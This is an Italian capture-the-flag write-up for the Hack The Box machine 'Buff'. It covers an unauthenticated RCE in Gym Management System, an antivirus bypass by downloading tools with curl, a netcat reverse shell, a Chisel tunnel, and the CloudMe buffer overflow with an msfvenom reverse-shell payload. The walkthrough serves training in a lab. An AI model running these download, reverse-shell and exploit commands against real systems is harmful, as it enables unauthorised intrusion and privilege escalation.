+++
date = '2026-08-11T14:19:18+02:00'
draft = false
title = 'Buff Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`31/12/2025`**

![Buff.png](/images/imgs_buff/Buff.png)

---
# Introduzione

**_Buff_** è una macchina **Windows** di livello **Easy** che si concentra sullo sfruttamento di vulnerabilità note e sulla pratica di competenze come il port forwarding e la binary exploitation.

L'accesso iniziale richiede lo sfruttamento di un'**Unauthenticated Remote Code Execution** in un noto **Gym Management CMS**.
La fase di privilege escalation prevede il **bypass dell'antivirus** per enumerare i servizi interni, la creazione di un tunnel con **Chisel** e, infine, lo sfruttamento di un **Buffer Overflow** locale nell'applicazione **CloudMe** per ottenere una shell come **Administrator**.

---
# Tecniche Utilizzate

- **Gym Management System 1.0 RCE (Unauthenticated)**

- **Antivirus Evasion (Living off the Land)**

- **Port Forwarding / Pivoting**

- **Buffer Overflow (CVE-2020-37070)**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- buff -Pn 
```

```text
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV buff -Pn
```

```text
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
```

**Porte Aperte**:

- **7680**/tcp - pando-pub

- **8080**/tcp - http (Apache)

## HTTP - Enumerazione Web

Navigando sulla porta **8080**, ho trovato un sito web di "**Fitness**" hostato su un server **Apache/PHP**.

![web.png](/images/imgs_buff/web.png)

![backend.png](/images/imgs_buff/backend.png)

Esplorando le pagine principali, ho notato il titolo "**mrb3n's Bro Hut**". Ho salvato preventivamente i potenziali username in un file **`users.txt`**: **mrb3n**, **ben**, **b3n**.

Mentre ispezionavo la sezione **Contact**, ho trovato un'informazione cruciale esposta a fondo pagina: "**Made using Gym Management Software 1.0**".

![web1.png](/images/imgs_buff/web1.png)

---
# Accesso Iniziale | Gym Management System RCE

Ho utilizzato **searchsploit** per cercare vulnerabilità note associate a questa specifica versione:

```bash
searchsploit Gym Management System 1.0
searchsploit -x php/webapps/48506.py
searchsploit -m php/webapps/48506.py
```

![scsploit.png](/images/imgs_buff/scsploit.png)

**Nota**: _L'exploit sfrutta una funzionalità insicura di upload dei file nel **CMS** per **bypassare i filtri** ed **eseguire codice da remoto**._

```bash
python2.7 48506.py http://buff:8080/
```

L'esecuzione mi ha droppato una **pseudo-shell**.

![initial_acces.png](/images/imgs_buff/initial_acces.png)

Da qui, ho letto la **user flag**:

```cmd
type \users\shaun\desktop\user.txt
```

![userf.png](/images/imgs_buff/userf.png)

## Shell Upgrade & Enumerazione Interna

La web shell iniziale era piuttosto limitata, quindi ho deciso di effettuare un upgrade utilizzando **`nc.exe`**. Ho provato a scaricarlo tramite **certutil**:

```cmd
certutil -urlcache -split -f http://10.10.15.152:8080/nc64.exe nc.exe
```

![filefail.png](/images/imgs_buff/filefail.png)

Il sistema ha probabilmente bloccato o scartato la connessione. Sono quindi passato a **curl**, che è disponibile nativamente nelle build più recenti di **Windows**:

```cmd
curl http://10.10.15.152:8000/nc64.exe -o nc.exe
```

![nc.png](/images/imgs_buff/nc.png)

**Positivo**. Il file è stato trasferito con successo.

```cmd
nc.exe 10.10.15.152 22667 -e powershell
```

![shell_upgrade.png](/images/imgs_buff/shell_upgrade.png)

Ottenuta una sessione **PowerShell** stabile, ho tentato di trasferire **winPEAS** per automatizzare l'enumerazione interna:

```cmd
certutil -urlcache -split -f http://10.10.15.152:8000/WinPEASx64.exe peas.exe
```

![av.png](/images/imgs_buff/av.png)

**Bloccato dall'antivirus**.

Tuttavia, **curl** ha bypassato completamente anche questa restrizione:

```cmd
curl http://10.10.15.152:8000/winPEASx64.exe -o peas.exe
.\peas.exe
```

![peas1.png](/images/imgs_buff/peas1.png)

Analizzando l'output di **winPEAS**, ho notato un servizio **MySQL** in esecuzione sulla porta **3306**. Sebbene avessi potuto provare a connettermi al database, mi sono concentrato su un altro servizio locale, in ascolto sulla porta **8888**:

```powershell
  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         2748            CloudMe
```

Inizialmente, ho avuto qualche difficoltà a identificare dove si trovasse l'eseguibile, ma ricontrollando l'output di **winPEAS** è emerso il percorso esatto nella sezione dei permessi:

![perm.png](/images/imgs_buff/perm.png)

---
# Privilege Escalation | CloudMe Buffer Overflow (CVE-2020-37070)

Una rapida ricerca su **Google** per "**cve Cloudme**" mi ha indirizzato direttamente a una nota vulnerabilità di **Buffer Overflow** che affligge la versione **`1.11.2`**. Poiché la macchina **HTB** si chiama letteralmente **Buff**, ho capito senza alcun dubbio che questa fosse la strada corretta.

**Nota**: _La **CVE-2020-37070** è un classico **Stack-based Buffer Overflow**. Il servizio di sincronizzazione **CloudMe**, in ascolto localmente sulla porta **8888**, non convalida correttamente la lunghezza dei dati in entrata prima di copiarli in un buffer di memoria a dimensione fissa. Inviando una stringa eccessivamente lunga (**oltre 1052 byte**), un attaccante può far andare in overflow questo buffer e sovrascrivere l'**Extended Instruction Pointer** (**EIP**). Sostituendo l'**EIP** con l'indirizzo di memoria di un'**istruzione JMP ESP**, il flusso di esecuzione dell'applicazione viene forzatamente reindirizzato direttamente nello shellcode personalizzato dell'attaccante situato nello stack, portando a una **Local Privilege Escalation** e all'esecuzione di codice arbitrario._

Ho trovato un **PoC** funzionante su **Exploit-DB**: https://www.exploit-db.com/exploits/48389.

![buffcve.png](/images/imgs_buff/buffcve.png)

Ho analizzato il codice dell'exploit e ho notato che il payload di default si limitava ad aprire **`calc.exe`**.

Quindi, ho generato un payload per una **reverse shell unstaged** personalizzato utilizzando **msfvenom**:

```bash
msfvenom -e x86 -p windows/reverse_shell_tcp LHOST=10.10.15.152 LPORT=22666 -b '\x00\x0A\x0D' -f python
```

**Nota**: _Ho scelto specificamente un payload **unstaged** (**`windows/shell_reverse_tcp`**) perché lo spazio nel buffer era abbastanza grande da contenere l'intero shellcode, permettendomi così di catturare la connessione usando un semplice listener **netcat** anziché dover configurare un **`multi/handler`** su **Metasploit**._

![payload.png](/images/imgs_buff/payload.png)

Ho incollato lo shellcode generato nello script dell'exploit. Di default, **msfvenom** inserisce l'output in una variabile chiamata **`buf`** (a meno che non venga specificato diversamente con la flag **`-v`**). Per far funzionare l'exploit senza dover rinominare tutto, ho semplicemente aggiunto la riga **`payload = buf`** allo script.

![exploit.png](/images/imgs_buff/exploit.png)

Poiché il servizio **CloudMe** vulnerabile era in ascolto solo localmente (**`127.0.0.1:8888`**), avevo bisogno di inoltrare la porta verso la mia macchina attaccante. Ho trasferito **`chisel.exe`** usando l'ormai fidato **curl**:

```cmd
curl http://10.10.15.152:8000/chisel.exe -o chisel.exe
```

Ho quindi creato il tunnel:

```bash
# Attaccante
chisel server -p 8000 --reverse

# Vittima
.\chisel.exe client 10.10.15.152:8000 R:8888:127.0.0.1:8888
```

![chisel.png](/images/imgs_buff/chisel.png)

Con il tunnel stabilito, ho avviato un listener **netcat** sulla porta **22666** e ho eseguito l'exploit:

```bash
nc -lvnp 22667
python3 exp.py
```

![privesc.png](/images/imgs_buff/privesc.png)

Reverse shell come **Administrator**. Ho infine prelevato la **root flag**:

```cmd
type C:\users\administrator\desktop\root.txt
```

![rootf.png](/images/imgs_buff/rootf.png)

---
# Considerazioni Finali

Una macchina **Easy**, e forse uno dei migliori box sulla piattaforma per fare pratica con il **Buffer Overflow** in un ambiente realistico e con restrizioni.

La fase di privilege escalation costringe all'utilizzo di strumenti di port forwarding come **Chisel** per raggiungere servizi interni, dimostrando inoltre come l'impiego di strumenti nativi di base (come **curl**) possa a volte **bypassare** facilmente configurazioni dell'**AV** che bloccano invece i classici binari **living-off-the-land** come **certutil**.

**Fonti**:

- **Gym Management System 1.0 RCE | https://www.exploit-db.com/exploits/48506**

- **CloudMe 1.11.2 - Buffer Overflow (PoC) | https://www.exploit-db.com/exploits/48389**